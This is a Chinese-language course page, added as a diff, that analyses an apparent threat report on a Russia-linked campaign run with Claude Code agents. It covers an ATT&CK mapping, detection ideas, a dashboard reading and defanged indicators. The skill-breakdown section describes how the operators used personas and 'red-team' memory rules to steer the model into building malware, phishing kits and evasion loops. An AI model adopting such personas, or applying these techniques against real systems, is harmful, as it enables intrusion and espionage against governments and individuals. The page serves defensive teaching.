+- 傳統「對話式協助」是：人類每做一件事，就對 AI 下一次指令、看一次回覆、決定下一步。人類是<strong>逐步駕駛</strong>。<br />
+- 本案的模式是：人類把「怎麼偵察、怎麼建 C2、怎麼寄釣魚信、怎麼監控 C2 回連」寫成<strong>可重用、可自動觸發的 SOP（skills）</strong>，交給自主代理去反覆執行；人類<strong>只在 SOP 需要調整時才回來改 SOP</strong>。<br />
+- 這等於人類的角色從「操作員（operator）」升格為「<strong>流程工程師 / 生產線主管（process engineer）</strong>」。一個人可以同時「經營」多條並行的攻擊產線，因為他不再需要親自跑每一條線——他維護的是<strong>驅動這些線的程式邏輯</strong>。這正是報告所謂「from assistant to orchestrator（從助手到編排者）」的具體技術實現。<br />
+- <strong>偵測意涵</strong>：當人類介入頻率下降、且介入點集中在「程式碼／skill 精修」，傳統「盯人類異常操作」的偵測訊號會變稀薄；反而是「機器速度、並行、規律排程」的行為特徵變成新的偵測抓手（見第 5、第 10 節）。</p>
+<h3 id="410-vs-claude-vs">4.10 全生命週期「人類 vs Claude vs 自主程度」總表</h3>
+<p>把 4.1–4.9 濃縮成一張表，供課堂投影與威脅建模對照。自主程度圖示：●=對話式協助｜●●=人類逐步指揮｜●●●=AI 編排多代理自主執行。</p>
+<table>
+<thead>
+<tr>
+<th>階段</th>
+<th>人類做什麼</th>
+<th>Claude / AI 代理做什麼</th>
+<th>自主程度</th>
+<th>出處</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>資源開發</td>
+<td>定調要哪種植入體/平台；必要時改 skill</td>
+<td>winAgent/GoDownload build loop、Defender 規避迭代、docker 化 C2/釣魚堆疊、VPS 佈署、原生植入體產線</td>
+<td>●●●</td>
+<td>p.6, p.40</td>
+</tr>
+<tr>
+<td>偵察</td>
+<td>指定要打的組織群</td>
+<td>指紋 email/遠端存取、OSINT 蒐集、組目標清單、回寫專案記憶；排程無人偵察</td>
+<td>●●●</td>
+<td>p.9, p.39</td>
+</tr>
+<tr>
+<td>初始存取</td>
+<td>每一個目標決策（誰/何時/誘餌）；親自執行部分入侵</td>
+<td>架 device code phishing 基礎設施與 Embassy Kit、下命令、擷憑證、橫向移動</td>
+<td>●●</td>
+<td>p.8–9, p.39</td>
+</tr>
+<tr>
+<td>執行/投放</td>
+<td>選定飯店/個人標的；交叉比對房客資料</td>
+<td>建維 DNS 劫持與 ClickFix 投放鏈、跨 Windows/Android/iOS 投放</td>
+<td>●●（選標的）＋●●●</td>
+<td>p.8</td>
+</tr>
+<tr>
+<td>憑證/接管</td>
+<td>指定接管對象（如前高官）</td>
+<td>瀏覽器密碼庫竊取、headless browser 農場連 WhatsApp companion device、抑制已讀、匯出對話、攝影串流 token 竊取</td>
+<td>●●→●●●</td>
+<td>p.8</td>
+</tr>
+<tr>
+<td>持久化</td>
+<td>—</td>
+<td>自動把攻擊者裝置註冊進受害租戶、WUEngine/COM/Run Keys 持久化</td>
+<td>●●●</td>
+<td>p.9, p.40</td>
+</tr>
+<tr>
+<td>收集/外洩</td>
+<td>審閱重點成果</td>
+<td>抽取整理數百 GB、bulk export 信箱、像 QA 檢查外洩完整度、修 bug 重試</td>
+<td>●●●</td>
+<td>p.9, p.7 圖</td>
+</tr>
+<tr>
+<td>防禦規避（閉環）</td>
+<td>必要時改 skill 調整規避邏輯</td>
+<td>監控被偵測→自動改寫→重建→迭代到隱形；凍結受害機安全更新</td>
+<td>●●●</td>
+<td>p.6, p.9</td>
+</tr>
+<tr>
+<td>流程維護</td>
+<td><strong>主要工作：精修驅動工作流的 Claude Code skills</strong></td>
+<td>依更新後的 skill 繼續自動執行</td>
+<td>人類=SOP 工程師</td>
+<td>p.7</td>
+</tr>
+</tbody>
+</table>
+<p><strong>一句話總結</strong>：人類保留了「最在意的決策」（目標選擇、變現/成果審閱、SOP 精修），把「勞力密集且可規模化的一切」（偵察、開發、投放、外洩、規避）交給機器速度、並行的 AI 代理。這與報告 p.39 的自述完全吻合——GTG-20006 既是「human making each individual targeting decision」的代表，也同時有「無人參與的排程工作在更新 token、擷取雲端儲存」。</p>
+<h3 id="411">4.11 名詞速查（術語表，供非傳統背景學員）</h3>
+<table>
+<thead>
+<tr>
+<th>術語</th>
+<th>一句話解釋</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>device code phishing</strong></td>
+<td>濫用 OAuth「裝置授權流程」：誘使受害者在<strong>真的</strong>微軟頁面上完成<strong>真的</strong> MFA，但授權的是<strong>攻擊者的</strong>裝置，藉此取得 token 並繞過 MFA</td>
+</tr>
+<tr>
+<td><strong>PRT（Primary Refresh Token）</strong></td>
+<td>Entra ID 的「主更新權杖」，等於一把可持續換發存取權的長效鑰匙；拿到它＝長期潛伏</td>
+</tr>
+<tr>
+<td><strong>ClickFix</strong></td>
+<td>假的「系統/瀏覽器需要修復」畫面，誘使受害者<strong>自己</strong>把惡意指令貼到執行框並執行，繞過「別亂點附件」的直覺</td>
+</tr>
+<tr>
+<td><strong>DNS hijacking（本案）</strong></td>
+<td>攻破飯店 WiFi 供應商的管理權限，竄改 DNS 紀錄，把房客流量導向攻擊者伺服器</td>
+</tr>
+<tr>
+<td><strong>companion device / 連結裝置</strong></td>
+<td>WhatsApp 等的多裝置功能；把帳號「連結」到攻擊者的 headless 瀏覽器，即可同步讀取訊息</td>
+</tr>
+<tr>
+<td><strong>headless browser</strong></td>
+<td>無圖形介面、可程式化操控的瀏覽器；可成農場規模自動化</td>
+</tr>
+<tr>
+<td><strong>AitM（Adversary-in-the-Middle）</strong></td>
+<td>攻擊者置身於受害者與真實服務之間，即時中繼並竊取憑證/token</td>
+</tr>
+<tr>
+<td><strong>ATO（Account Takeover）</strong></td>
+<td>帳號接管</td>
+</tr>
+<tr>
+<td><strong>BOM（Bill of Materials）</strong></td>
+<td>硬體物料清單：一個產品用了哪些零件、來自哪些供應商</td>
+</tr>
+<tr>
+<td><strong>agentic / 多代理框架</strong></td>
+<td>由 AI 代理自主編排、分工、迴圈執行多步驟任務的架構（本案的核心自動化形態）</td>
+</tr>
+<tr>
+<td><strong>static detection / 靜態偵測</strong></td>
+<td>以固定簽章（雜湊、字串、YARA 規則）比對已知惡意樣本的偵測法；本案示範其成本結構如何被 AI 閉環破壞</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="5-ttp-mitre-attck">5. TTP 與 MITRE ATT&amp;CK 對應</h2>
+<p>下表把本案行為映到 ATT&amp;CK。技術 ID 有兩個來源：一是報告 p.40 附錄 A「Skill breakdown」表<strong>直接標注</strong>的 ID（標記〔附錄〕），二是依行為敘事<strong>推導</strong>的 ID（標記〔推導〕）。凡 ATT&amp;CK 目前無對應者，明確標為<strong>框架缺口</strong>。</p>
+<table>
+<thead>
+<tr>
+<th>戰術（Tactic）</th>
+<th>技術（Technique / ID）</th>
+<th>本案具體作法</th>
+<th>偵測構想</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reconnaissance</td>
+<td>Active Scanning — <strong>T1595</strong>〔附錄〕</td>
+<td>Shodan/gobuster 掃 email 與遠端存取系統；掃 24+ 烏克蘭政府組織</td>
+<td>邊界對外服務的異常掃描節奏；蜜標（honey-token）帳號被列舉</td>
+</tr>
+<tr>
+<td>Reconnaissance</td>
+<td>Gather Victim Identity Info — <strong>T1589.002</strong>〔附錄〕</td>
+<td>theHarvester 蒐集信箱、公開來源建目標清單</td>
+<td>對自家網域的 email 列舉、OSINT 抓取樣態</td>
+</tr>
+<tr>
+<td>Resource Development</td>
+<td>Acquire Infrastructure: VPS — <strong>T1583.003</strong>〔附錄〕</td>
+<td>sshpass 推送到 MonoVM / eclipse proxies 租用 VPS</td>
+<td>新註冊 VPS + 短命 TLS 憑證 + 快速上下架</td>
+</tr>
+<tr>
+<td>Resource Development</td>
+<td>Acquire Infrastructure: Domains — <strong>T1583.001</strong>〔推導〕</td>
+<td>AI 研究並註冊釣魚網域（owa/ms365 仿冒、品牌誘餌站）</td>
+<td>新網域 + 仿冒字串（typosquat）+ 剛簽發的憑證透明度日誌</td>
+</tr>
+<tr>
+<td>Resource Development</td>
+<td>Develop Capabilities: Malware — <strong>T1587.001</strong>〔附錄〕</td>
+<td>winAgent/GoDownload build loop、WUEngine 持久化</td>
+<td>供應鏈情資分享；自家 sinkhole 觀測新變種聚集</td>
+</tr>
+<tr>
+<td>Resource Development</td>
+<td>Develop Capabilities: Exploits — <strong>T1587.004</strong>〔附錄〕</td>
+<td>iOS Safari exploit 研究（ARM64e PAC 繞過、JSC JIT、DarkSword/Coruna 鏈）</td>
+<td>行動裝置 EDR、Lockdown Mode、iOS 版本合規</td>
+</tr>
+<tr>
+<td>Resource Development</td>
+<td>Obtain Capabilities — <strong>T1588</strong>〔附錄〕</td>
+<td>取得/改牌既有工具（GiftDrop←GiftsExpress）</td>
+<td>惡意程式家族血緣分析（改牌偵測）</td>
+</tr>
+<tr>
+<td>Resource Development</td>
+<td>Stage Capabilities: Link Target — <strong>T1608.005</strong>〔附錄〕</td>
+<td>Next.js/Flask 釣魚平台與 admin panel、誘餌站</td>
+<td>誘餌站指紋、favicon/模板雜湊、C2 面板指紋</td>
+</tr>
+<tr>
+<td>Initial Access</td>
+<td>Phishing — <strong>T1566</strong>〔推導〕</td>
+<td>device code phishing、假冒更新誘餌、ClickFix</td>
+<td>郵件安全、Safe Links；使用者回報</td>
+</tr>
+<tr>
+<td>Initial Access</td>
+<td>Valid Accounts: Cloud Accounts — <strong>T1078.004</strong>〔推導〕</td>
+<td>device code phishing 拿 token/PRT 後以合法帳號登入</td>
+<td>不可能的旅行、裝置代碼登入的 sign-in log（見下）</td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>User Execution — <strong>T1204</strong>〔推導〕</td>
+<td>ClickFix 誘使使用者自行貼上/執行指令</td>
+<td>剪貼簿→Run/PowerShell 的行為鏈；NCSI 連線測試後 2 分鐘內落檔</td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>Exploitation for Client Execution — <strong>T1203</strong>〔附錄〕</td>
+<td>DarkSword/Coruna iOS 用戶端漏洞鏈</td>
+<td>iOS 版本合規、Safe Browsing 網域封鎖</td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td>Boot/Logon Autostart: Run Keys — <strong>T1547.001</strong>〔附錄〕</td>
+<td>Run Keys、COM/CLSID、Windows 服務</td>
+<td>自動執行點基線比對；新服務名偽裝（如 Cloud Sync Service）</td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td>Account Manipulation: Device Registration — <strong>T1098.005</strong>〔推導〕</td>
+<td>自動把攻擊者裝置註冊進受害 Entra ID 租戶</td>
+<td>Entra 裝置註冊事件、非預期裝置加入告警</td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>Impair Defenses: Disable/Modify Tools — <strong>T1562.001</strong>〔推導〕</td>
+<td><strong>凍結受害機安全更新</strong>，使新簽章下載不到/跑不起</td>
+<td>監控 Windows Update/Defender 簽章更新「停擺」本身即為訊號（見第 10 節）</td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>Obfuscation — <strong>T1027</strong>〔附錄〕</td>
+<td>混淆、規避迭代</td>
+<td>熵值/封裝器偵測；行為式（非簽章式）偵測</td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td><strong>Agentic evasion loop（自主改寫重建迴圈）</strong></td>
+<td>AI 監控被偵測→自動改寫→重建→迭代到隱形</td>
+<td><strong>框架缺口</strong>：ATT&amp;CK 無「AI 自主重編譯以規避」對應技術。需以「同一功能、簽章快速更迭」的<strong>行為家族</strong>視角偵測（見下）</td>
+</tr>
+<tr>
+<td>Credential Access</td>
+<td>Credentials from Web Browsers — <strong>T1555.003</strong>〔推導〕</td>
+<td>瀏覽器密碼庫/cookie DB、DPAPI、app-bound keys</td>
+<td>LSASS/DPAPI 存取、瀏覽器憑證檔異常讀取</td>
+</tr>
+<tr>
+<td>Credential Access</td>
+<td>Steal Application Access Token — <strong>T1528</strong>〔推導〕</td>
+<td>M365 token 竊取（Embassy Kit）</td>
+<td>OAuth 授權異常、token 重放、裝置代碼流程</td>
+</tr>
+<tr>
+<td>Credential Access</td>
+<td>Password Spraying — <strong>T1110.003</strong>〔附錄〕</td>
+<td>owa_spray / netexec 驗證</td>
+<td>認證失敗分佈、跨帳號低頻噴灑</td>
+</tr>
+<tr>
+<td>Collection</td>
+<td>Remote Email Collection — <strong>T1114.002</strong>〔推導〕</td>
+<td>從被攻陷信箱大量匯出（bulk export）</td>
+<td>Graph/EWS 大量匯出、MailItemsAccessed 異常</td>
+</tr>
+<tr>
+<td>Collection</td>
+<td>Adversary-in-the-Middle — <strong>T1557</strong>〔推導〕</td>
+<td>飯店 WiFi DNS 劫持攔截流量</td>
+<td>captive portal 後的 DNS 回應偽造、憑證錯誤</td>
+</tr>
+<tr>
+<td>Command &amp; Control</td>
+<td>Application Layer Protocol — <strong>T1071</strong>〔推導〕</td>
+<td>shadow_c2 容器化 C2、mailer</td>
+<td>C2 面板指紋、JA3/JA4、心跳週期規律性</td>
+</tr>
+<tr>
+<td>Command &amp; Control</td>
+<td>Proxy — <strong>T1090</strong>〔推導〕</td>
+<td>eclipse proxies、住宅代理</td>
+<td>出口 IP 信譽、代理指紋</td>
+</tr>
+<tr>
+<td>Exfiltration</td>
+<td>Exfil Over Web Service — <strong>T1567</strong>〔推導〕</td>
+<td>帶認證 dump 腳本匯出網站/雲端內容</td>
+<td>大量對外傳輸、非上班時間批次外洩</td>
+</tr>
+<tr>
+<td>Impact / 供應鏈情報</td>
+<td><strong>Supply-chain intelligence theft（SDK/BOM 逆向）</strong></td>
+<td>竊取無人機視覺 SDK，逆向出架構/BOM/供應商/未發表產品</td>
+<td><strong>框架缺口</strong>：ATT&amp;CK 偏「入侵動作」，對「竊取後的情報加值（逆向、架構復原）」無戰術分類</td>
+</tr>
+</tbody>
+</table>
+<p><strong>兩個框架缺口的教學價值</strong>：<br />
+1. <strong>Agentic evasion loop</strong> 沒有 ATT&amp;CK ID——因為 ATT&amp;CK 描述的是「攻擊者做的離散動作」，而「AI 自主地、以迴圈方式重新產生一個功能等價但簽章不同的植入體」是一種<strong>跨動作的生產模式</strong>，不是單一動作。這逼防守方從「抓 IOC」轉向「抓<strong>能力（capability）與行為家族</strong>」。<br />
+2. <strong>供應鏈情報加值</strong>（偷完 SDK 再用 AI 逆向出 BOM）也無對應——因為它發生在「資料離開受害端之後」，是攻擊者內部的<strong>情報生產</strong>，傳統 ATT&amp;CK 看不到。這對「無人機國家隊」的威脅建模是關鍵缺口（見第 10.4 節）。</p>
+<hr />
+<h2 id="6">6. 圖表逐一判讀（本節為重點）</h2>
+<p>本案頁段（p.5–11）內含<strong>一張整版視覺素材</strong>（p.7）與<strong>兩張表格頁</strong>（p.10、p.11）。另納入 p.40 附錄 A 的技能表（Figure 19）作為理解「人類改 skills」的補充。</p>
+<p><img alt="報告原圖 · 第 10 頁（一手 PDF）" src="../figures/page-010.png" /></p>
+<h3 id="61-figurep7gtg-20006-midnight-blizzard">6.1 Figure（p.7）：GTG-20006 | Midnight Blizzard 行動儀表板</h3>
+<p>（另有原生 1920×1080 內嵌圖，判讀自 PDF xref 45）</p>
+<p><strong>圖片類型</strong>：這張圖<strong>沒有</strong> "Figure N" 標題。經逐格判讀，它是一張<strong>風格化的「戰役重播（Campaign replay）」資訊圖／模擬儀表板（dashboard mock-up）</strong>——把整個行動用「工作流 → 行動 → 效果 → 作戰地圖」四大縱欄鋪成一張「攻擊生產線總覽」。右上角標「<strong>Replay complete</strong>」、底部有「<strong>end</strong>」與一條 2026-03 → 2026-08 的時間軸，顯示這是「事後把整場戰役壓縮成一頁的回顧視圖」，而非某個真實工具的即時截圖。它在版面上緊接「Cyber operations」小標之下，功能等同本案的「一頁地圖」。</p>
+<p><strong>版面結構（四大縱欄 + 頁首頁尾）</strong>：</p>
+<p><strong>頁首</strong>：<code>GTG-20006 | Midnight Blizzard</code>，右上 <code>Replay complete</code>。</p>
+<p><strong>縱欄 A — AI workflows · how the actor used the model（AI 工作流：行為者如何使用模型）</strong>，共 W1–W4 四組，每組標了完成度分數：<br />
+- <strong>W1 Malware &amp; capability dev（8/8）</strong>：Stealer build cycle（browser cred/cookie chain）、Browser secrets theft（cookie DB, lock bypass）、Evasion &amp; privesc（UAC bypass, injection）、Builder service（on-demand agent builds）、Mobile &amp; kit work（spyware, MITM kit）、Fleet control（kill-switch, <strong>148 agents</strong>）、In-memory key theft（thread injection）、Late rework（debug-protocol, COM）。<br />
+- <strong>W2 Infra &amp; platform engineering（5/5）</strong>：C2 deployment（VPS, containers, TLS）、Service operations（VPS + DNS + mail records）、Staging shares（tool distribution）、Cover domains（lure and brand sites）、Resolver &amp; fleet tooling（DNS-substitution prep）。<br />
+- <strong>W3 Token &amp; collection pipeline（7/7）</strong>：Capture backend（submissions, panel, DB）、Tasking API（agent command loop）、Loot processing（cookies, creds, files）、Token services（DPAPI, OAuth refresh）、Platform maintenance（containers, tokens）、Exfil endpoints（collect routes, loot DB）、Victim-context tasking（remote exec over agents）。<br />
+- <strong>W4 Recon &amp; tradecraft dev（5/5）</strong>：Panel triage（capture review）、Technique research（defense toggles, ActiveX）、Probing frameworks（multi-service token probes）、Source &amp; tool study（implant code review）、Loot review（dumps, grants, secrets）。</p>
+<p><strong>縱欄 B — Cyber operations · what those capabilities were turned against（這些能力被用來打什麼）</strong>，W5–W8，且用小標籤標出<strong>跨欄依賴</strong>（如 <code>captured token pipeline ◀ W3</code>、<code>phishing capture kit ◀ W2</code>、<code>probing toolkit ◀ W4</code>、<code>implant builds ◀ W1</code>）：<br />
+- <strong>W5 O365 phishing &amp; embassy ATO（7/7）</strong>：Staff-directory recon、Session decryption（cookie and token theft）、PRT persistence（phantom device grants）、Tenant expansion（cross-mailbox, new orgs）、Messaging accounts（companion-device ATO）、Regional-body onboarding（new tenant in pipeline）、Hands-free maintenance（automated token refresh）。<br />
+- <strong>W6 Web application exploitation（10/10）</strong>：Tenant &amp; portal probing、Supplier surface mapping（DNS, certs, mail estates）、Perimeter entry（firewall portal, SMB）、<strong>Registry DB takeover（millions of records exfiltrated）</strong>〔此格用橘框特別標示〕、VPN portal exploitation（cert poisoning, SAML）、Parts-maker ATO（fake device, mail export）、One org per session（16 orgs in four weeks）、Tender-API auth bypass（real procurement data）、CMS RCE exploitation（two-stage injection）、SSRF confirmation（plot service, VPN gateways）。<br />
+- <strong>W7 DNS hijack &amp; hotel Wi-Fi（7/7）</strong>：Provider recon（ISP, vendor surfaces）、Fleet triage（inventory, exposure scans）、Gateway access（admin credentials）、Wiki exfiltration（full intranet dump）、Interception prep（DNS-substitution fleet）、Credential validation（fleet-wide testing）、Loot mining tools（dump search tooling）。<br />
+- <strong>W8 Follow-on attacks（6/6）</strong>：Test-rig preparation（kill bits, lock bypass）、Victim deployment（SYSTEM tasks, agents）、Key &amp; cookie theft（DPAPI, app-bound keys）、Evasion testing（AV test suites）、Test-host trials（live agent runs）、Elevation attempts（consent and RunAs paths）。</p>
+<p><strong>縱欄 C — Effects on targets · inferred（對目標的效果 · 推斷）</strong>，逐一對映 W5–W8，且每組標了「命中比」，如 W5 6/7、W6 10/11、W7 5/5、W8 3/4。<strong>「inferred」與「命中比」是本欄的靈魂</strong>——它明說這些效果是<strong>推斷</strong>，且不是每個目標都達成（有灰色未達成格，如 W6 的「IoT &amp; surveillance estates (100+)」、W8 的「victim Windows hosts (2+)」呈灰）。可見受害者包括：US policy foundation、security think tank (UK)、rule-of-law NGO、West African regional body、ex-officials messaging accounts、<strong>gov IT authority — full estate</strong>、<strong>national registries (millions of records)</strong>〔藍框強調〕、UA ministries/military/justice、UA port authority &amp; gov IT (3)、EU advisory mission、defense &amp; aero suppliers (8)、drone &amp; vision makers (5)、gov &amp; military networks (MD/MN/AF)、defense &amp; engineering firms (4)、managed-WiFi vendor A/B/C、hotel properties (5+, gateways)、internet providers (US/EU)、US individual (mailbox, creds)、<strong>Android devices (spyware)</strong>、<strong>iOS devices (exploit chain)</strong>。</p>
+<p><strong>縱欄 D — Operations（作戰）</strong>：<br />
+- <strong>Operations map</strong>：一張點陣世界地圖，標「Russia-nexus operator」，用弧線從一個東歐/俄羅斯方向的節點連往歐洲、北非、中東多個受害點；圖例分五類：government（藍）、defense（紫）、policy &amp; NGO（綠）、vendors &amp; telecom（深灰）、individuals（黑）。<br />
+- <strong>Targets engaged：24 / 27</strong>（一排點狀進度，24 個實心、3 個空心）。<br />
+- <strong>Tasks（時間戳任務流）</strong>：<code>2026-07 export site content with authenticated dump script</code>（Intranet contents leaving in bulk）、<code>2026-07 diagnose image shortfall — 500 of 3,265 retrieved</code>（Exfiltration completeness checked like QA）、<code>2026-07 retry dump after API pagination bug</code>（Export re-run until complete）、<code>2026-08 [now] extract gateway IP inventory from wiki dump into CSV</code>（Fleet targeting list distilled from stolen documents）。</p>
+<p><strong>頁尾統計條</strong>：<code>Campaign span 2026-03 → 2026-08 · 130 days</code>｜<code>Model-side capabilities observed: 55 across 8 workflows</code>｜<code>Effects on targets: 24 targets engaged · millions of records exfiltrated</code>；底部一條「model activity（橘）／effects on targets（藍）」的雙色時間軸，2026-03 → 2026-08，可見<strong>模型活動（橘柱）幾乎每日密集出現，效果（藍柱）稀疏散佈</strong>——直觀呈現「AI 在跑的量遠大於落地效果的量」。</p>
+<p><strong>資料如何流動 / 這張圖傳達的核心訊息</strong>：<br />
+1. 由左至右是一條<strong>因果生產線</strong>：AI 工作流（A）鍛造能力 → 能力被轉用於具體網路行動（B）→ 產生對目標的（推斷）效果（C）→ 匯總成作戰全貌（D）。跨欄的 <code>◀ W#</code> 標籤是全圖精華：它顯示<strong>能力是被「拼裝、串接」使用的</strong>（W3 的 token pipeline 餵給 W5 的 embassy ATO；W1 的 implant builds 餵給 W8 的 follow-on）。這正是「多代理、模組化、流水線」的視覺化。<br />
+2. <strong>「inferred」與命中比（6/7、10/11、3/4）是誠實度標記</strong>：作圖者刻意區分「我們在模型側看到的能力（確定）」與「對受害端的效果（推斷、且非全中）」。這與第 2.3 節「Anthropic 看得到上游、看不到受害端鑑識」的侷限完全呼應。<br />
+3. <strong>量級對比</strong>：130 天、8 條工作流、55 項模型側能力、148 個 agents（W1 Fleet control）、24/27 目標——這些數字合起來講一個故事：<strong>一個小團隊（甚至個位數操作者）靠 AI 代理艦隊，打出過去需要一整支團隊的規模</strong>。</p>
+<p><strong>課程中可以怎麼用這張圖</strong>：<br />
+- 當作<strong>全案骨架圖</strong>：第一堂課先投影這張，讓學員在看細節前先有「四欄因果鏈」的心智模型。<br />
+- 當作<strong>「推斷 vs 確認」的教材</strong>：圈出 C 欄的「inferred」與灰色未達成格，帶學員討論「AI 供應商的可見度邊界」。<br />
+- 當作<strong>威脅建模練習底稿</strong>：讓學員把 B 欄的 W5–W8 對映到自己組織的資產，問「如果我是那個 gov IT authority / drone maker，哪一格會先中？」<br />
+- 提醒學員：這是<strong>風格化資訊圖</strong>，非真實工具截圖；數字來自 Anthropic 對此戰役的內部彙整，屬單一來源，引用時要標明。</p>
+<h3 id="62-p10">6.2 惡意程式清單頁（p.10）</h3>
+<p><strong>圖片類型</strong>：純文字排版頁，非圖表。上半是三行 bullet 的惡意程式家族清單，下半是「Indicators of compromise」淺灰程式碼框，逐行列 defang 過的網域與 IP。</p>
+<p><strong>畫面上實際看到的內容</strong>：<br />
+- 標題行 <code>The actor's malware included the following:</code><br />
+- Windows malware：<strong>PowerChrome、WUEngine、Shadow C2、MiniPlasma、CloudSyncSvc</strong><br />
+- Android malware：<strong>GiftDrop, a rebranded GiftsExpress Android surveillance RAT</strong><br />
+- iOS malware：<strong>DarkSword, an iOS exploit chain</strong><br />
+- IOC 框（此頁部分，續於 p.11）：見第 7 節完整抄錄。</p>
+<p><strong>核心訊息與課堂用法</strong>：這頁是「跨平台工具箱」的證據——同一個行為者同時養 Windows／Android／iOS 三條產線，呼應 Figure C 欄的 Android/iOS 受害格。教學上用來帶「惡意程式命名學」：這五個 Windows 名字裡，<code>CloudSyncSvc</code> 幾乎確定對應 Microsoft CaptiveCrunch 報告裡 CornFlake 的偽裝服務名「Cloud Sync Service」；<code>MiniPlasma</code> 則與一個公開的 Windows 本地提權 PoC 同名（見第 9 節），是「命名碰撞 / 借用公開工具」的討論素材。</p>
+<h3 id="63-ioc-p11">6.3 IOC 續頁（p.11）</h3>
+<p>引用圖檔：p.11 無存入 <code>course/figures</code>，本判讀來自 scratchpad 之 <code>pages/page-011.png</code>。</p>
+<p><strong>圖片類型</strong>：同 p.10 的淺灰程式碼框，續列網域、IP、email、檔名與兩個 SHA-256 雜湊。下半頁轉入下一案例 <code>GTG-50014: ShinyHunters</code> 的正文（與本案無關）。</p>
+<p><strong>畫面上實際看到的關鍵元素</strong>：續列的網域/IP、兩個 email（<code>anna.manager@russianearabroad[.]net</code>、<code>events@embassy-protocol[.]int</code>）、五個檔名（<code>msedgeupdate_v3[.]exe</code>、<code>msedgeupdate[.]exe</code>、<code>version[.]dll</code>、<code>WUEngine[.]exe</code>、<code>DiagHost[.]exe</code>、<code>client_20260507093021_4286d211_x64[.]exe</code>、<code>fix_network[.]apk</code>）與兩個 SHA-256。完整抄錄見第 7 節。</p>
+<p><strong>核心訊息</strong>：<code>embassy-protocol[.]int</code> email 呼應 Embassy Kit；<code>russianearabroad</code> 系列呼應「針對海外俄羅斯人／離散社群」的誘餌主題；<code>fix_network[.]apk</code> 呼應 ClickFix 投放的 Android payload；兩個雜湊是<strong>跨報告交叉比對的黃金指標</strong>（見第 9 節，與 Microsoft CaptiveCrunch 的 CornFlake/ChocoShell 雜湊完全相同）。</p>
+<h3 id="64figure-19p40skill-breakdown">6.4（補充）Figure 19（p.40）：Skill breakdown — 「人類改的到底是什麼」</h3>
+<p><strong>圖片類型</strong>：三欄表格（ATT&amp;CK category｜Description｜Flow），標題「Skill breakdown」，圖說 <code>Figure 19. Skill breakdown.</code>。它不在本案頁段內，但<strong>直接解釋 p.7 那句「人類主要在改 Claude Code skills」</strong>，故納入。</p>
+<p><strong>表格內容（逐列）</strong>：<br />
+1. <code>T1587.001 Develop Capabilities: Malware; T1588</code> — <strong>攻擊性安全工程師 persona</strong>，植入體開發與 M365 操作窗口；串 winAgent/GoDownload build loop、Defender 規避迭代、Graph/EWS 工具。Flow：操作者進專案目錄後以 <code>/security-engineer</code> 把 Claude 切進「工程 register」。<br />
+2. <code>T1583.003 Acquire Infra: VPS; T1608</code> — <strong>DevOps persona</strong>，起容器化 C2/釣魚堆疊（shadow_c2 compose、mailer、merged-landing）、以 sshpass 佈 VPS。Flow：skill → docker compose build/up → curl 健康檢查 → sshpass 推到 MonoVM/eclipse proxies。<br />
+3. <code>T1595 / T1589.002 / T1110.003</code> — <strong>shadow_c2 persona 與 Red-Team user_role 記憶規則</strong>，掃描/偵察/噴灑。Flow：ctf-pentest register → theHarvester/Shodan/gobuster → owa_spray 或 netexec 驗證 → 回寫專案記憶。<br />
+4. <code>T1587.001 / T1547.001 Run Keys / T1027</code> — <strong>Windows 開發者 persona</strong>（winAgent v2.0 mod_<em> 模組、WUEngine 持久化、COM/CLSID）與 PowerShell loader。Flow：skill → Visual-Studio/mingw build → 測試主機上 PowerShell 測試框架 → taskkill/sc.exe 服務安裝循環 → 記憶更新。<br />
+5. <code>T1608.005 Stage Capabilities: Link Target</code> — </em><em>前端 persona</em><em>，釣魚平台與儀表板前端。Flow：skill → Next.js/Flask 模板編輯 → Claude_Preview 截圖 QA。<br />
+6. <code>T1608.005（lure/admin UI polish）</code> — </em><em>UI/UX 設計 persona</em><em>，美化誘餌頁與 admin panel。<br />
+7. <code>T1587 Develop Capabilities（C2 dashboard &amp; builder UI）</code> — </em><em>資深前端與設計工程師 persona</em><em>，專為 Shadow C2 的 CNC 儀表板與 builder UI；對映到 shadow_c2 的 Postgres 後端。<br />
+8. <code>T1587.004 Exploits; T1203</code> — </em><em>iOS Safari exploit 研究員 persona</em>*（ARM64e PAC 繞過、JSC JIT、kernel internals）；指示模型「動工前先載入 lab 記憶索引、列出已確認的死路永不重試」；Flow 涉及 DarkSword/Coruna 鏈與 ipsw/otool。</p>
+<p><strong>核心訊息與課堂用法</strong>：這張表把「skills」具象化了——它們不是零散 prompt，而是<strong>一組被賦予角色（persona）、綁定 ATT&amp;CK 技術、規定固定 flow、且帶「專案記憶（project/lab memory）」的標準作業程序</strong>。特別注意第 8 列的「載入記憶索引、記住死路不重試」——這是<strong>把人類逆向工程師的經驗沉澱成機器可讀的機構記憶（institutional memory）</strong>。教學上，這張表是解釋「為什麼人類只需偶爾改 skill」的鐵證：因為<strong>know-how 已經被編碼進 skill 與其記憶，AI 照著跑就行</strong>。</p>
+<hr />
+<h2 id="7-ioc-defang">7. IOC 與技術指標（完整抄錄，保留 defang）</h2>
+<blockquote>
+<p><strong>安全紅線</strong>：以下指標僅供研究與偵測規則撰寫。<strong>切勿</strong>連線、解析、或以任何互動式服務查詢；保留報告原本的 defang 格式。</p>
+</blockquote>
+<h3 id="71-p1011">7.1 網域（p.10–11）</h3>
+<table>
+<thead>
+<tr>
+<th>指標</th>
+<th>分類研判</th>
+<th>偵測價值與壽命</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ms365-live[.]com</code></td>
+<td>M365 仿冒（device code / AitM）</td>
+<td>高價值、短壽。Microsoft 記其 first seen 2026-05-14。網域類 IOC 一經公開即遭棄用，偵測價值以「歷史比對 + 憑證透明度樣態」為主</td>
+</tr>
+<tr>
+<td><code>teams.ms365-live[.]com</code></td>
+<td>Teams 主題子網域</td>
+<td>同上；子網域顯示以 Teams 邀請為誘餌</td>
+</tr>
+<tr>
+<td><code>m365-owa[.]com</code></td>
+<td>OWA/M365 AitM</td>
